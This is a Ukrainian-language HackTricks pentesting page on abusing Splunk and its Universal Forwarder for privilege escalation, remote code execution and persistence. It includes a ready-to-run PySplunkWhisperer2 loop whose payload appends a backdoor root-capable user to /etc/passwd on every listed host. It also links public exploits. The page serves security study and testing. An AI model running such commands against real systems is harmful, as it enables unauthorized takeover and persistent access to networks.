# Splunk LPE та Постійну

{% hint style="success" %}
Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}

Якщо ви **перераховуєте** машину **всередині** або **ззовні** і знаходите **запущений Splunk** (порт 8090), якщо вам пощастить знати будь-які **дійсні облікові дані**, ви можете **зловживати сервісом Splunk** для **виконання оболонки** від імені користувача, що запускає Splunk. Якщо його запускає root, ви можете підвищити привілеї до root.

Також, якщо ви **вже root і сервіс Splunk не слухає лише на localhost**, ви можете **вкрасти** файл **паролів** **з** сервісу Splunk і **зламати** паролі або **додати нові** облікові дані до нього. І підтримувати постійність на хості.

На першому зображенні нижче ви можете побачити, як виглядає веб-сторінка Splunkd.



## Резюме експлуатації агента Splunk Universal Forwarder

Для отримання додаткових деталей перевірте пост [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Це лише резюме:

**Огляд експлуатації:**
Експлуатація, що націлюється на агента Splunk Universal Forwarder (UF), дозволяє зловмисникам з паролем агента виконувати довільний код на системах, що запускають агента, потенційно компрометуючи всю мережу.

**Ключові моменти:**
- Агент UF не перевіряє вхідні з'єднання або автентичність коду, що робить його вразливим до несанкціонованого виконання коду.
- Загальні методи отримання паролів включають їх знаходження в мережевих каталогах, файлових спільних ресурсах або внутрішній документації.
- Успішна експлуатація може призвести до доступу на рівні SYSTEM або root на скомпрометованих хостах, ексфільтрації даних та подальшого проникнення в мережу.

**Виконання експлуатації:**
1. Зловмисник отримує пароль агента UF.
2. Використовує API Splunk для надсилання команд або скриптів агентам.
3. Можливі дії включають витяг файлів, маніпуляцію обліковими записами користувачів та компрометацію системи.

**Вплив:**
- Повна компрометація мережі з правами SYSTEM/root на кожному хості.
- Потенціал для відключення ведення журналів, щоб уникнути виявлення.
- Встановлення бекдорів або програм-вимагачів.

**Приклад команди для експлуатації:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Використовувані публічні експлойти:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Зловживання запитами Splunk

**Для отримання додаткової інформації перегляньте пост [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримати HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.

</details>
{% endhint %}
